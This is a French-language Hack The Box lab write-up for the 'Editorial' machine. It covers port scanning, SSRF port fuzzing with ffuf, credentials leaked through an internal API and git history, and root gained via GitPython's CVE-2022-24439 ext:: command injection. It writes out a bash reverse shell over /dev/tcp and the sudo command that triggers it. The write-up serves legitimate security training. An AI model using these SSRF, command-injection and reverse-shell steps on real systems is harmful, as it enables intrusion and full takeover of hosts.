<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Editorial</title>
<meta name=description content="Platforme: Hack The Box Lien: Editorial Niveau: Facile OS: Linux Editorial est une machine Linux assez simple, mais qui présente quelques particularités. …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-editorial/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Editorial"><meta property="og:description" content="Platforme: Hack The Box Lien: Editorial Niveau: Facile OS: Linux Editorial est une machine Linux assez simple, mais qui présente quelques particularités. …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Editorial/Editorial.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Editorial/Editorial.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Editorial"><meta name=twitter:description content="Platforme: Hack The Box Lien: Editorial Niveau: Facile OS: Linux Editorial est une machine Linux assez simple, mais qui présente quelques particularités. …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-editorial/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-editorial/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Editorial/Editorial.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-editorial/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-editorial/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Editorial</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>16 Octobre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Editorial>Editorial</a></li><li>Niveau: Facile</li><li>OS: Linux</li></ul><hr><p>Editorial est une machine Linux assez simple, mais qui présente quelques particularités. L&rsquo;application web est vulnérable au Server-Side Request Forgery (SSRF), mais elle nécessite un fuzzing des ports internes pour découvrir des données sensibles. En exploitant un point de terminaison API, nous récupérons des identifiants qui nous donnent un accès initial au système. Au cours d&rsquo;une énumération plus poussée, nous découvrons une série de commits Git, dont l&rsquo;un expose les informations d&rsquo;identification d&rsquo;un autre utilisateur, ce qui permet un déplacement latéral. L&rsquo;escalade des privilèges est réalisée en exploitant le CVE-2022-24439 en combinaison avec un script exécutable en tant que root.</p><p>Addresse IP cible - <code>10.10.11.20</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.20 Editorial
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,80
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-16 21:07 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.20
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.052s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://editorial.htb
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 9.14 seconds
</span></span></code></pre></div><p>Nmap trouve deux ports ouverts, 22 (SSH) et 80 (HTTP), de plus il y a une redirection vers <code>editorial.htb</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.20 editorial.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumération>Enumération</h2><p>Sur <code>http://editorial.htb</code>, nous trouvons le site web d&rsquo;une maison d&rsquo;édition.</p><p><img src=/images/HTB-Editorial/Editorial_website.png alt="Editorial website"></p><p>En cliquant sur <code>Publish with Us</code>, nous accédons à <code>http://editorial.htb/upload</code>, où nous pouvons soit envoyer un lien, soit télécharger un fichier.</p><p><img src=/images/HTB-Editorial/editorial_upload_feature.png alt="Editorial Publish with Us page"></p><p>Puisque l&rsquo;application accepte une url fournie par l&rsquo;utilisateur, testons le SSRF. Une fois le formulaire rempli, nous capturons la requête obtenue après avoir cliqué sur le bouton <code>Preview</code>.</p><p><img src=/images/HTB-Editorial/Upload_Cover_Req.png alt="Editorial upload-cover request"></p><p>Nous envoyons la requête et obtenons une réponse valide (<strong>Status Code 200OK</strong>), le header du serveur (<strong>nginx/1.18.0 (Ubuntu)</strong>), et un contenu à <code>/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</code> provenant très probablement d&rsquo;une application interne. Cela signifie que le SSRF fonctionne, car l&rsquo;application récupère et renvoie le contenu du service interne à <code>127.0.0.1:80</code>.</p><p><img src=/images/HTB-Editorial/Upload_Cover_response.png alt="Editorial upload-cover request response"></p><p>Un autre test consisterait à utiliser notre propre adresse IP avec un numéro de port de notre choix, nous aurons également un listener qui écoutera sur ce même port.</p><p><img src=/images/HTB-Editorial/SSRF_test.png alt="SSRF test on local Kali"></p><p>Sur le listener, nous recevons une réponse qui confirme également la présence du SSRF.</p><p><img src=/images/HTB-Editorial/SSRF_nc_connection.png alt="SSRF local test nc response"></p><p>En examinant le contenu de la réponse avec <code>http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</code>, nous observons une image banale.</p><p><img src=/images/HTB-Editorial/response_content.png alt="Editorial SSRF response content"></p><p>Nous sommes sur la bonne voie, mais il nous manque un élément. La plupart du temps, les applications internes fonctionnent sur un port différent qui n&rsquo;est pas exposé au public. Afin de trouver le bon port, nous effectuerons un peu de fuzzing.</p><p>J&rsquo;utilise la requête que nous avons interceptée avec Burp plus tôt, je la formate autant que possible et je supprime les headers redondants.</p><p>En l&rsquo;utilisant avec ffuf, nous trouvons le port <code>5000</code>.</p><blockquote><p>Cette opération peut être répliquée avec la fonction Intruder de Burp, mais gardez à l&rsquo;esprit que la version gratuite limite cette fonction, donc fuzzer tous les ports vous prendrait beaucoup de temps! Ffuf le fait en moins de 4 minutes, ce qui nous fait gagner beaucoup de temps.</p></blockquote><pre tabindex=0><code>ffuf -u &#39;http://editorial.htb/upload-cover&#39; \
-d $&#39;-----------------------------29074654981783001802154691355\r\nContent-Disposition: form-data; name=&#34;bookurl&#34;\r\n\r\nhttp://127.0.0.1:FUZZ/\r\n-----------------------------29074654981783001802154691355\r\nContent-Disposition: form-data; name=&#34;bookfile&#34;; filename=&#34;&#34;\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------29074654981783001802154691355--&#39; \
-w &lt;(seq 1 65535) \
-H &#39;Content-Type: multipart/form-data; boundary=---------------------------29074654981783001802154691355&#39; \
-H &#39;Host: editorial.htb&#39; \
-t 100 \
-mc all \
-fs 61
</code></pre><p><img src=/images/HTB-Editorial/SSRF_ffuf_Fuzzing.png alt="SSRF ffuf internal port fuzzing"></p><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>-u</td><td>Spécifie l&rsquo;URL cible</td></tr><tr><td>-d $</td><td>Spécifie le corps de la requête HTTP</td></tr><tr><td>-w</td><td>Wordlist (nous utilisons une liste générée de manière dynamique pour tous les numéros de port)</td></tr><tr><td>FUZZ</td><td>Ce texte sera remplacé par chaque nombre au cours du processus de fuzzing</td></tr><tr><td>-H</td><td>Spécifie l&rsquo;en-tête HTTP</td></tr><tr><td>-t 100</td><td>Définit le nombre de threads simultanés</td></tr><tr><td>-mc</td><td>Spécifie le code d&rsquo;état de la réponse HTTP à filtrer</td></tr><tr><td>all</td><td>Si elle est utilisée, ffuf ne filtrera pas les réponses sur la base des codes d&rsquo;état et affichera toutes les réponses</td></tr><tr><td>-fs 61</td><td>Filtre en fonction de la taille de la réponse. Ici, les réponses dont la taille du corps est de 61 octets seront filtrées</td></tr></tbody></table><p><img src=/images/HTB-Editorial/internal_port_5000_found.png alt="SSRF Internal port 5000 found"></p><h2 id=accès-initial>Accès initial</h2><p>Maintenant, nous renvoyons la requête avec <code>http://127.0.0.1:5000</code> et obtenons un répertoire différent (<code>uploads</code>).</p><p><img src=/images/HTB-Editorial/SSRF_internal_port_number.png alt="SSRF Internal port number request"></p><p>Lorsque nous allons sur <code>http://editorial.htb/static/uploads/e9ed8f81-925d-40e0-945e-7fcb30899573</code>, un fichier est automatiquement téléchargé sur notre machine.</p><p><img src=/images/HTB-Editorial/File_Downloaded.png alt="SSRF File Downloaded"></p><p>Il contient des données JSON.</p><p><img src=/images/HTB-Editorial/JSON_data_ugly.png alt="JSON Data ugly"></p><p>Avec <code>jq</code> nous pouvons le rendre plus lisible.</p><pre tabindex=0><code>cat e9ed8f81-925d-40e0-945e-7fcb30899573 | jq
</code></pre><p><img src=/images/HTB-Editorial/JSON_data_pretty.png alt="JSON Data pretty"></p><p>Il s&rsquo;agit d&rsquo;une liste de points d&rsquo;accès à l&rsquo;API.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-JSON data-lang=JSON><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#e06c75>&#34;messages&#34;</span>: [
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#e06c75>&#34;promotions&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;description&#34;</span>: <span style=color:#98c379>&#34;Retrieve a list of all the promotions in our library.&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;endpoint&#34;</span>: <span style=color:#98c379>&#34;/api/latest/metadata/messages/promos&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;methods&#34;</span>: <span style=color:#98c379>&#34;GET&#34;</span>
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#e06c75>&#34;coupons&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;description&#34;</span>: <span style=color:#98c379>&#34;Retrieve the list of coupons to use in our library.&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;endpoint&#34;</span>: <span style=color:#98c379>&#34;/api/latest/metadata/messages/coupons&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;methods&#34;</span>: <span style=color:#98c379>&#34;GET&#34;</span>
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#e06c75>&#34;new_authors&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;description&#34;</span>: <span style=color:#98c379>&#34;Retrieve the welcome message sended to our new authors.&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;endpoint&#34;</span>: <span style=color:#98c379>&#34;/api/latest/metadata/messages/authors&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;methods&#34;</span>: <span style=color:#98c379>&#34;GET&#34;</span>
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#e06c75>&#34;platform_use&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;description&#34;</span>: <span style=color:#98c379>&#34;Retrieve examples of how to use the platform.&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;endpoint&#34;</span>: <span style=color:#98c379>&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;methods&#34;</span>: <span style=color:#98c379>&#34;GET&#34;</span>
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  ],
</span></span><span style=display:flex><span>  <span style=color:#e06c75>&#34;version&#34;</span>: [
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#e06c75>&#34;changelog&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;description&#34;</span>: <span style=color:#98c379>&#34;Retrieve a list of all the versions and updates of the api.&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;endpoint&#34;</span>: <span style=color:#98c379>&#34;/api/latest/metadata/changelog&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;methods&#34;</span>: <span style=color:#98c379>&#34;GET&#34;</span>
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#e06c75>&#34;latest&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;description&#34;</span>: <span style=color:#98c379>&#34;Retrieve the last version of api.&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;endpoint&#34;</span>: <span style=color:#98c379>&#34;/api/latest/metadata&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e06c75>&#34;methods&#34;</span>: <span style=color:#98c379>&#34;GET&#34;</span>
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Après les avoir testés, la réponse que nous obtenons avec <code>http://127.0.0.1:5000/api/latest/metadata/messages/authors</code> déclenche un autre téléchargement de fichier à <code>http://editorial.htb/static/uploads/c1c51caa-8a20-4f95-aca1-3a55e0a0fb69</code>.</p><p><img src=/images/HTB-Editorial/message_authors_api_endpoint.png alt="message authors api endpoint"></p><p><img src=/images/HTB-Editorial/message_authors_file.png alt="message authors api endpoint file downloaded"></p><p>Il s&rsquo;agit d&rsquo;un message de bienvenue pour un auteur avec ses identifiants, <code>dev:dev080217_devAPI!@</code>.</p><p><img src=/images/HTB-Editorial/dev_credentials.png alt="dev credentials"></p><p>En utilisant ces identifiants, nous nous connectons via SSH et récupérons le drapeau utilisateur.</p><p><img src=/images/HTB-Editorial/user_flag_editorial.png alt="dev shell and user flag"></p><h3 id=mouvement-latéral-shell-en-tant-que-prod>Mouvement latéral (Shell en tant que prod)</h3><p>Dans <code>/home/dev/apps</code> nous trouvons un répertoire <code>.git</code>.</p><p><img src=/images/HTB-Editorial/git-file.png alt=".git file"></p><p>L&rsquo;exécution de <code>git log</code> à l&rsquo;intérieur de ce dernier permet d&rsquo;obtenir une liste de commits.</p><p><img src=/images/HTB-Editorial/git_log.png alt="git log command"></p><p>Après avoir utilisé <code>git show</code> sur le troisième commit en partant du haut, nous trouvons d&rsquo;autres informations d&rsquo;identification, <code>prod:080217_Producti0n_2023!@</code>.</p><pre tabindex=0><code>git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
</code></pre><p><img src=/images/HTB-Editorial/prod_creds.png alt="prod user credentials"></p><p>Avec ces derniers, nous obtenons un autre shell SSH sous le nom de <code>prod</code>, le répertoire personnel de cet utilisateur ne contient rien de spécial.</p><p>Cependant, il est autorisé à exécuter la commande <code>/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py</code> avec n&rsquo;importe quel argument (<code>*</code>) en tant qu&rsquo;utilisateur root.</p><p><img src=/images/HTB-Editorial/sudo-l_cmd.png alt="sudo -l command"></p><p>Examinons le contenu de <code>/opt/internal_apps/clone_changes/clone_prod_change.py</code>.</p><p><img src=/images/HTB-Editorial/clone_prod_change_script.png alt="clone_prod_change python script"></p><p>Ce script clone un répertoire Git dans un répertoire spécifique (<code>/opt/internal_apps/clone_changes</code>). L&rsquo;option <code>multi_options=["-c protocol.ext.allow=always"]</code> permet au protocole <code>ext::</code> d&rsquo;être utilisé pour le clonage.</p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><p>En utilisant <code>pip3 list</code> nous trouvons la liste de tous les paquets Python installés sur le système. <code>GitPython</code> se démarque immédiatement, il utilise la version <code>3.1.29</code>.</p><p><img src=/images/HTB-Editorial/python_pkg_list.png alt="installed python packages list"></p><p>Des recherches sur les vulnérabilités de cette version nous permettent de trouver le <a href=https://github.com/PyCQA/bandit/issues/971>CVE-2022-24439</a> avec un PoC <a href=https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858>ici</a>.</p><p>Le code exploite le protocole <code>ext::</code> de Git qui permet aux utilisateurs de passer des commandes externes au lieu des protocoles standards tels que <code>https</code> et <code>ssh</code>, ce qui permet de réaliser une injection de commande.</p><p>Utilisons un script bash afin d&rsquo;obtenir un shell inversé en tant que <code>root</code>.</p><p>Nous créons <code>revshell.sh</code> et le rendons exécutable avec <code>chmod +x revshell.sh</code>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#7f848e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e06c75>IP</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;YOUR_IP&#34;</span>  
</span></span><span style=display:flex><span><span style=color:#e06c75>PORT</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;PORT_NUMBER&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/bin/bash -i &gt;&amp; /dev/tcp/<span style=color:#e06c75>$IP</span>/<span style=color:#e06c75>$PORT</span> 0&gt;&amp;<span style=color:#d19a66>1</span>
</span></span></code></pre></div><p>Ensuite, nous exécutons la commande ci-dessous pour obtenir un shell root sur notre listener, ce qui nous permet de lire le drapeau root dans <code>/root</code>.</p><pre tabindex=0><code>sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &#39;ext::/tmp/revshell.sh&#39;
</code></pre><p><img src=/images/HTB-Editorial/git_script_ext.png alt="Reverse shell trigger"></p><p><img src=/images/HTB-Editorial/root_flag_editorial.png alt="Editorial root flag"></p><p>Ce défi était assez simple, du moment que vous étiez minutieux dans votre énumération. Merci d&rsquo;avoir pris le temps de lire cet article et portez vous bien!</p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-blurry/>&#8592;
Précédent:
HTB: Blurry</a></p><p class=prev-post-date>octobre 10, 2024</p></div><div class=next-post><p><a href=/fr/posts/thm-k2/>Suivant:
THM: K2
&#8594;</a></p><p class=next-post-date>octobre 24, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a><ul><li><a href=#mouvement-latéral-shell-en-tant-que-prod>Mouvement latéral (Shell en tant que prod)</a></li></ul></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>